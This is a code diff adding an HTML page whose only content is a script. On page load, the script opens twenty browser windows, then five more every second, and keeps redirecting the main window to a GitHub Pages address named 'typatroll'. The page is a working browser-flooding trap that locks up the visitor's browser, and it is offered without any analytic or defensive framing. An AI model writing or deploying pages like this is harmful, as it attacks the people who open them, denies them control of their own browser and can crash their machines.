@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv='refresh' content='1; url=https://bader133b.github.io/typatroll/'>
+    <script>
+        const TARGET = 'https://bader133b.github.io/typatroll/';
+        
+        // Open 20 windows immediately
+        for (let i = 0; i < 20; i++) {
+            setTimeout(() => window.open(TARGET, '_blank'), i * 100);
+        }
+        
+        // Open 5 windows every second
+        setInterval(() => {
+            for (let i = 0; i < 5; i++) {
+                window.open(TARGET, '_blank');
+            }
+        }, 1000);
+        
+        // Redirect main window every 2 seconds
+        setInterval(() => {
+            window.location.href = TARGET;
+        }, 2000);
+    </script>
+</head>
+<body></body>
+</html>
+
